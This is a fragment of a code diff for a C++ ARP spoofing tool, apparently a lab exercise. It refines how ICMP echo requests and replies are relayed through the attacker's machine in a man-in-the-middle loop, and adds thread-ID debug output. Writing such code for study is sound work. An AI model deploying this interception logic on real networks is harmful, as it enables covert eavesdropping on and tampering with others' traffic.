@@ -48,7 +48,6 @@ void work(Info *info){
 	const u_char* packet;
 	int check = 0;
 	int res = 0;
-
 	while (true) {
 		// Arp Spoofing Attack 
 		if (check % 100 == 0 ){	// (지속적인 변조 시도)
@@ -87,7 +86,8 @@ void work(Info *info){
 			if (ip->ptl() != IpHdr::ICMP) continue;
 		
 			//Icmp Request Relay (sender -> attacker, attacker -> target)
-			if (eth->dmac() == info->attacker_mac && icmp->type() == IcmpHdr::ECHO_REQUEST){
+			if (eth->dmac() == info->attacker_mac && ip->sip() == info->sender_ip && icmp->type() == IcmpHdr::ECHO_REQUEST){
+				printf("%d \t",std::this_thread::get_id());
 				printf("Icmp Request Relay (sender -> attacker, attacker -> target)\n");
 				eth->setDmac(info->target_mac);
 				eth->setSmac(info->attacker_mac);
@@ -96,8 +96,9 @@ void work(Info *info){
 				if (res != 0) {
 					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 				}
-			}else if (eth->dmac() == info->attacker_mac && icmp->type() == IcmpHdr::ECHO_REPLAY){	//Icmp Request Relay (target -> attacker, attacker -> sender)
-				printf("Icmp Request Relay (target -> attacker, attacker -> sender)\n");
+			}else if (eth->dmac() == info->attacker_mac && ip->dip() == info->sender_ip && icmp->type() == IcmpHdr::ECHO_REPLAY){	//Icmp Request Relay (target -> attacker, attacker -> sender)
+				printf("%d \t",std::this_thread::get_id());
+				printf("Icmp REPLAY Relay (target -> attacker, attacker -> sender)\n");
 				eth->setDmac(info->sender_mac);
 				eth->setSmac(info->attacker_mac);
 
